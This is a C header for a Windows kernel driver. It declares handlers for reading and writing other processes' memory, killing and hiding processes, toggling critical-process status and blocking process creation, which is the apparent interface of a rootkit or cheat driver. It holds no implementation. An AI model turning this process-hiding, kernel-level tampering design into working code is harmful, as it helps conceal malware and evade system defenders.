#pragma once
#include <ntddk.h>
#include "defines.h"
#include "memory.h"
#pragma comment(lib,"ntdll.lib")
NTSTATUS HandleMWBaseAddrRequest(PIRP Irp, PNTSTATUS Status, PULONG ByteIO, ULONG mw_addr);
NTSTATUS HandleKeReadRequest(PNTSTATUS Status, PULONG ByteIO, PKERNEL_READ_REQUEST ReadInput);
NTSTATUS HandleKeWriteRequest(PNTSTATUS Status, PULONG ByteIO, PKERNEL_WRITE_REQUEST ReadInput);
NTSTATUS HandleKeKillProcessRequest(PNTSTATUS Status, PKERNEL_KILL_PROCESS_REQUEST ReadInput);
NTSTATUS HandleKeHideProcessRequest(PKERNEL_HIDE_PROCESS_REQUEST ReadInput);

void remove_links(PLIST_ENTRY Current);


//prototype
EXTERN_C NTSTATUS NTAPI NtSetInformationProcess(HANDLE, ULONG, PVOID, ULONG);
NTSTATUS HandleSetProcessCriticalStatRequest(PNTSTATUS Status, PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST ReadInput);
NTSTATUS HandleDeleteProcessCriticalStatRequest(PNTSTATUS Status, PKERNEL_SET_DELETE_CRITICAL_PROCESS_STAT_REQUEST ReadInput);
NTSTATUS HandleLockdownProcessCreation(PNTSTATUS Status);
NTSTATUS HandleUnlockProcessCreation(PNTSTATUS Status);


